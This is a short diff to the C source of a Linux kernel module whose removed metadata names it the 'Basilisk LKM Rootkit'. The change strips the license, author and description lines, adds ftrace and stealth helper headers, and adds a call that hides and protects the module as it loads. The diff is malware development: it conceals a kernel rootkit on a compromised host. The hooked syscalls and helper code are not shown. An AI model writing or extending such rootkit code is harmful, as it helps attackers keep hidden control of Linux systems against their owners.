@@ -1,9 +1,6 @@
 #include "include/main.h"
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Skelly");
-MODULE_DESCRIPTION("Basilisk LKM Rootkit");
-MODULE_VERSION("2.5");
+#include "include/ftrace_helper.h"
+#include "include/stealth_helper.h"
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
@@ -22,6 +19,10 @@ static int __init basilisk_init(void) {
     return err;
 
   pr_info("basilisk: loaded\n");
+  #ifdef HIDE_LKM_ON_LOAD
+    h_lkm_hide_and_protect();
+  #endif
+
   return 0;
 }
 
